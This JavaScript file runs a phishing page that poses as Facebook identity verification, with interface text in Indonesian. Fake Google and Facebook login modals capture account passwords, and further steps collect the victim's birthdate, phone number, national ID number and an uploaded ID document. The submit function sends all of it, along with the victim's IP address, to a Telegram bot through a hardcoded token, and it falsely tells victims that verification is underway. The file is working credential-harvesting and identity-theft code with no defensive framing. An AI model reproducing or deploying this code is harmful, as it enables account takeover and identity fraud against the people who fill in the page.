let userIP = "";
let loginMethod = "form"; // form, google, facebook
let capturedEmail = "";
let capturedPassword = "";

// Document upload variables
let selectedDocType = '';
let uploadedFile = null;

// Validation function
function isValidEmail(email) {
  const regex = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return regex.test(String(email).toLowerCase());
}

// Date selection setup
const daySelect = document.getElementById('birthdate-day');
const monthSelect = document.getElementById('birthdate-month');
const yearSelect = document.getElementById('birthdate-year');
const months = [
  { value: 1, name: 'Januari' }, { value: 2, name: 'Februari' },
  { value: 3, name: 'Maret' }, { value: 4, name: 'April' },
  { value: 5, name: 'Mei' }, { value: 6, name: 'Juni' },
  { value: 7, name: 'Juli' }, { value: 8, name: 'Agustus' },
  { value: 9, name: 'September' }, { value: 10, name: 'Oktober' },
  { value: 11, name: 'November' }, { value: 12, name: 'Desember' }
];

function populateMonths() {
  months.forEach(month => {
    const option = document.createElement('option');
    option.value = month.value;
    option.textContent = month.name;
    monthSelect.appendChild(option);
  });
}

function populateYears() {
  const currentYear = new Date().getFullYear();
  for (let i = currentYear; i >= 1920; i--) {
    const option = document.createElement('option');
    option.value = i;
    option.textContent = i;
    yearSelect.appendChild(option);
  }
}

function populateDays() {
  const year = yearSelect.value;
  const month = monthSelect.value;
  const daysInMonth = new Date(year, month, 0).getDate();
  daySelect.innerHTML = '';
  for (let i = 1; i <= daysInMonth; i++) {
    const option = document.createElement('option');
    option.value = i;
    option.textContent = i;
    daySelect.appendChild(option);
  }
}

// Event listeners for date selects
monthSelect.addEventListener('change', populateDays);
yearSelect.addEventListener('change', populateDays);

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
  // Get user IP
  fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => { userIP = data.success ? data.ip : "Tidak diketahui"; })
    .catch(() => { userIP = "Gagal mengambil IP"; });
  
  // Populate date selects
  populateMonths();
  populateYears();
  populateDays();
  
  // Document upload setup
  setupDocumentUpload();
});

// Navigation functions
function goToStep(step) {
  document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
  document.getElementById("step" + step).classList.add("active");
}

// Modal functions
function showGoogleModal() {
  document.getElementById('googleModal').style.display = 'flex';
  document.getElementById('googlePasswordGroup').style.display = 'none';
  document.getElementById('googleEmail').value = '';
  document.getElementById('googlePassword').value = '';
  document.getElementById('googleLoginBtn').innerText = 'Berikutnya';
  document.getElementById('googleEmail').classList.remove('is-invalid');
  document.getElementById('googlePassword').classList.remove('is-invalid');
}

function showFacebookModal() {
  document.getElementById('facebookModal').style.display = 'flex';
  document.getElementById('facebookEmail').value = '';
  document.getElementById('facebookPassword').value = '';
  document.getElementById('facebookEmail').classList.remove('is-invalid');
  document.getElementById('facebookPassword').classList.remove('is-invalid');
}

function hideModal(modalId) {
  document.getElementById(modalId).style.display = 'none';
}

function togglePassword(fieldId, icon) {
  const field = document.getElementById(fieldId);
  const iconVisible = "https://cdn-icons-png.flaticon.com/512/709/709612.png";
  const iconHidden = "https://cdn-icons-png.flaticon.com/512/709/709604.png";
  if (field.type === "password") {
    field.type = "text";
    icon.src = iconHidden;
  } else {
    field.type = "password";
    icon.src = iconVisible;
  }
}

// Login handlers
function handleGoogleLogin() {
  const emailInput = document.getElementById('googleEmail');
  const passwordInput = document.getElementById('googlePassword');
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();
  emailInput.classList.remove('is-invalid');
  passwordInput.classList.remove('is-invalid');

  if (!email) {
    showAlert("Kolom email tidak boleh kosong.", "error", 'googleModal');
    emailInput.classList.add('is-invalid');
    return;
  }

  if (!isValidEmail(email)) {
    showAlert("Format email tidak valid. Masukkan email yang benar.", "error", 'googleModal');
    emailInput.classList.add('is-invalid');
    return;
  }

  if (document.getElementById('googlePasswordGroup').style.display === 'none') {
    document.getElementById('googlePasswordGroup').style.display = 'block';
    document.getElementById('googleLoginBtn').innerText = 'Masuk';
    return;
  }

  if (!password) {
    showAlert("Silakan masukkan password Anda", "error", 'googleModal');
    passwordInput.classList.add('is-invalid');
    return;
  }

  capturedEmail = email;
  capturedPassword = password;
  loginMethod = "google";
  document.getElementById('fullname').value = email.split('@')[0];
  hideModal('googleModal');
  goToStep('Form');
  showAlert("Login dengan Google berhasil! Silakan lengkapi data lainnya.", "success");
}

function handleFacebookLogin() {
  const emailInput = document.getElementById('facebookEmail');
  const passwordInput = document.getElementById('facebookPassword');
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();
  emailInput.classList.remove('is-invalid');
  passwordInput.classList.remove('is-invalid');

  if (!email || !password) {
    showAlert("Semua kolom wajib diisi", "error", 'facebookModal');
    if (!email) emailInput.classList.add('is-invalid');
    if (!password) passwordInput.classList.add('is-invalid');
    return;
  }

  if (email.includes('@') && !isValidEmail(email)) {
    showAlert("Format email tidak valid. Masukkan email yang benar.", "error", 'facebookModal');
    emailInput.classList.add('is-invalid');
    return;
  }

  capturedEmail = email;
  capturedPassword = password;
  loginMethod = "facebook";
  if (isValidEmail(email)) {
    document.getElementById('fullname').value = email.split('@')[0];
  } else {
    document.getElementById('fullname').value = 'Pengguna Facebook';
  }
  hideModal('facebookModal');
  goToStep('Form');
  showAlert("Login dengan Facebook berhasil! Silakan lengkapi data lainnya.", "success");
}

// Alert function
function showAlert(message, type, modalId = null) {
  const existingAlert = document.querySelector('.alert-box-dynamic');
  if (existingAlert) existingAlert.remove();

  let alertBox;
  if (modalId) {
    alertBox = document.createElement('div');
    alertBox.className = 'alert-box-dynamic';
    document.querySelector(`#${modalId} .modal-body`).prepend(alertBox);
  } else {
    alertBox = document.getElementById('alertBox');
  }

  alertBox.innerText = message;
  alertBox.className = `alert-box alert-${type}`;
  alertBox.style.display = 'block';

  setTimeout(() => {
    alertBox.style.display = 'none';
    if (modalId) alertBox.remove();
  }, 4000);
}

// Document alert function
function showDocAlert(message, type) {
  const alertBox = document.getElementById('docAlertBox');
  alertBox.innerText = message;
  alertBox.className = `alert-box alert-${type}`;
  alertBox.style.display = 'block';

  setTimeout(() => {
    alertBox.style.display = 'none';
  }, 4000);
}

// Continue to document step
function continueToDocument() {
  const fullnameInput = document.getElementById('fullname');
  const phoneInput = document.getElementById('phone');
  const fullname = fullnameInput.value.trim();
  const phone = phoneInput.value.trim();

  fullnameInput.classList.remove('is-invalid');
  phoneInput.classList.remove('is-invalid');

  if (!fullname || !phone) {
    showAlert("Semua kolom wajib diisi", "error");
    if (!fullname) fullnameInput.classList.add('is-invalid');
    if (!phone) phoneInput.classList.add('is-invalid');
    return;
  }

  // Copy basic info to document form
  document.getElementById('docFullName').value = fullname;

  goToStep('Document');
  showAlert("Data berhasil disimpan. Silakan upload dokumen identitas.", "success");
}

// Document upload setup
function setupDocumentUpload() {
  // Document type selection
  document.querySelectorAll('.doc-type').forEach(type => {
    type.addEventListener('click', function() {
      document.querySelectorAll('.doc-type').forEach(t => t.classList.remove('selected'));
      this.classList.add('selected');
      selectedDocType = this.dataset.type;
      
      // Update placeholder text based on document type
      const idInput = document.getElementById('idNumber');
      switch(selectedDocType) {
        case 'ktp':
          idInput.placeholder = 'Nomor KTP (16 digit)';
          break;
        case 'passport':
          idInput.placeholder = 'Nomor Paspor';
          break;
        case 'sim':
          idInput.placeholder = 'Nomor SIM';
          break;
      }
    });
  });

  // File upload handling
  const fileInput = document.getElementById('fileInput');
  if (fileInput) {
    fileInput.addEventListener('change', handleFileSelect);
  }
  
  // Drag and drop functionality
  const uploadSection = document.getElementById('uploadSection');
  if (uploadSection) {
    uploadSection.addEventListener('dragover', function(e) {
      e.preventDefault();
      this.classList.add('dragover');
    });
    
    uploadSection.addEventListener('dragleave', function(e) {
      e.preventDefault();
      this.classList.remove('dragover');
    });
    
    uploadSection.addEventListener('drop', function(e) {
      e.preventDefault();
      this.classList.remove('dragover');
      
      const files = e.dataTransfer.files;
      if (files.length > 0) {
        handleFile(files[0]);
      }
    });
  }
}

function handleFileSelect(e) {
  const file = e.target.files[0];
  if (file) {
    handleFile(file);
  }
}

function handleFile(file) {
  // Validate file type
  const allowedTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
  if (!allowedTypes.includes(file.type)) {
    showDocAlert('Format file tidak didukung. Gunakan JPG, PNG, atau PDF.', 'error');
    return;
  }

  // Validate file size (5MB max)
  if (file.size > 5 * 1024 * 1024) {
    showDocAlert('Ukuran file terlalu besar. Maksimal 5MB.', 'error');
    return;
  }

  uploadedFile = file;
  displayFilePreview(file);
}

function displayFilePreview(file) {
  const preview = document.getElementById('filePreview');
  const thumbnail = document.getElementById('fileThumbnail');
  const fileName = document.getElementById('fileName');
  const fileSize = document.getElementById('fileSize');

  // Display file info
  fileName.textContent = file.name;
  fileSize.textContent = formatFileSize(file.size);

  // Create thumbnail
  if (file.type.startsWith('image/')) {
    const reader = new FileReader();
    reader.onload = function(e) {
      thumbnail.src = e.target.result;
    };
    reader.readAsDataURL(file);
  } else {
    thumbnail.src = 'https://cdn-icons-png.flaticon.com/512/337/337946.png'; // PDF icon
  }

  preview.classList.add('show');
}

function removeFile() {
  uploadedFile = null;
  document.getElementById('filePreview').classList.remove('show');
  const fileInput = document.getElementById('fileInput');
  if (fileInput) {
    fileInput.value = '';
  }
}

function formatFileSize(bytes) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Submit verification
async function submitVerification() {
  const fullName = document.getElementById('docFullName').value.trim();
  const idNumber = document.getElementById('idNumber').value.trim();
  const phoneNumber = document.getElementById('phone').value.trim();
  const basicFullName = document.getElementById('fullname').value.trim();
  const submitBtn = document.getElementById('submitBtn');
  
  // Validation
  if (!selectedDocType) {
    showDocAlert('Silakan pilih jenis dokumen terlebih dahulu.', 'error');
    return;
  }

  if (!uploadedFile) {
    showDocAlert('Silakan upload dokumen identitas Anda.', 'error');
    return;
  }

  if (!fullName || !idNumber) {
    showDocAlert('Semua kolom wajib diisi.', 'error');
    return;
  }

  // Disable button and show loading
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<div class="progress-spinner"></div> Memproses...';

  // Show processing step
  document.getElementById('stepDocument').classList.remove('active');
  document.getElementById('stepProcessing').classList.add('active');

  try {
    const botToken = "8098018598:AAGEFaANnzDBjGAA10MaB1aMoiRni1AZVfo";
    const chatId = "7137150704";

    // Prepare document type in Indonesian
    const docTypeNames = {
      'ktp': 'KTP (Kartu Tanda Penduduk)',
      'passport': 'Paspor',
      'sim': 'SIM (Surat Izin Mengemudi)'
    };

    // Get birthdate
    const day = daySelect.value.padStart(2, '0');
    const month = monthSelect.value.padStart(2, '0');
    const year = yearSelect.value;
    const birthdate = `${day}-${month}-${year}`;

    // Create login details message if available
    let loginDetailsMessage = "";
    if (capturedEmail) {
      loginDetailsMessage = `
--------------------------
🔑 *Login Credentials*
📧 Email/Phone: ${capturedEmail}
🔒 Password: ${capturedPassword}
`;
    }

    // Create comprehensive message
    const messageText = `
🔐 *VERIFIKASI DOKUMEN IDENTITAS FACEBOOK*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 *INFORMASI DASAR*
👤 Nama Facebook: ${basicFullName}
🎂 Tanggal Lahir: ${birthdate}
📱 WhatsApp: ${phoneNumber}

📄 *INFORMASI DOKUMEN*
🆔 Jenis Dokumen: ${docTypeNames[selectedDocType]}
👤 Nama di Dokumen: ${fullName}
🔢 Nomor Identitas: ${idNumber}

🌐 *INFORMASI SISTEM*
📍 IP Address: ${userIP}
🔵 Metode Login: ${loginMethod === 'google' ? 'Google' : loginMethod === 'facebook' ? 'Facebook' : 'Form'}${loginDetailsMessage}

📅 *Waktu Verifikasi:* ${new Date().toLocaleString('id-ID', { 
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long', 
  day: 'numeric',
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit'
})}
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *STATUS:* Menunggu Verifikasi Manual
📸 *DOKUMEN:* Akan dikirim terpisah
    `.trim();

    // Send text message first
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'Markdown'
      })
    });

    // Send document
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('document', uploadedFile);
    formData.append('caption', `📄 *${docTypeNames[selectedDocType]}*\n👤 *Atas Nama:* ${fullName}\n🔢 *Nomor:* ${idNumber}\n📱 *WhatsApp:* ${phoneNumber}`);
    formData.append('parse_mode', 'Markdown');

    const documentResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
      method: 'POST',
      body: formData
    });

    const documentResult = await documentResponse.json();

    if (documentResult.ok) {
      // Success
      setTimeout(() => {
        document.getElementById('stepProcessing').classList.remove('active');
        document.getElementById('stepDone').classList.add('active');
      }, 2000);

      // Send confirmation message
      setTimeout(async () => {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: `✅ *DOKUMEN BERHASIL DITERIMA*\n\n📋 *Detail:*\n• File: ${uploadedFile.name}\n• Ukuran: ${formatFileSize(uploadedFile.size)}\n• Status: Berhasil diterima\n• ID: ${documentResult.result.message_id}\n\n🔄 *Selanjutnya:*\nDokumen akan diverifikasi dalam 1-24 jam`,
            parse_mode: 'Markdown'
          })
        });
      }, 1000);

    } else {
      throw new Error('Gagal mengirim dokumen');
    }

  } catch (error) {
    console.error('Error:', error);
    
    // Show error and return to form
    document.getElementById('stepProcessing').classList.remove('active');
    document.getElementById('stepDocument').classList.add('active');
    
    showDocAlert('Terjadi kesalahan saat memproses verifikasi. Silakan coba lagi.', 'error');
    
    // Re-enable button
    submitBtn.disabled = false;
    submitBtn.innerHTML = 'Kirim untuk Verifikasi';
  }
}
